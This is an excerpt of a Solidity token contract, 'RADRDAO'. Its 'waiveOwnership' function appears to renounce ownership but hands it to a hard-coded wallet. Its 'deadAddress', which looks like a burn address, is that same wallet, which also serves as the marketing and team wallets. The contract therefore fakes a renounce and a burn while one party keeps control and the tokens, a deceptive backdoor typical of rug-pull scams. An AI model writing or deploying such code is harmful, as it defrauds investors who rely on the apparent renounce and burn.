...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xA4aac628aea637b4Df360886D1E8F37A00fd16eE));
        _owner = address(0xA4aac628aea637b4Df360886D1E8F37A00fd16eE);
    }
...
contract RADRDAO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RADRDAO";
    string private _symbol = "RADRDAO";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA4aac628aea637b4Df360886D1E8F37A00fd16eE);
    address payable public teamWalletAddress = payable(0xA4aac628aea637b4Df360886D1E8F37A00fd16eE);
    address public immutable deadAddress = 0xA4aac628aea637b4Df360886D1E8F37A00fd16eE;
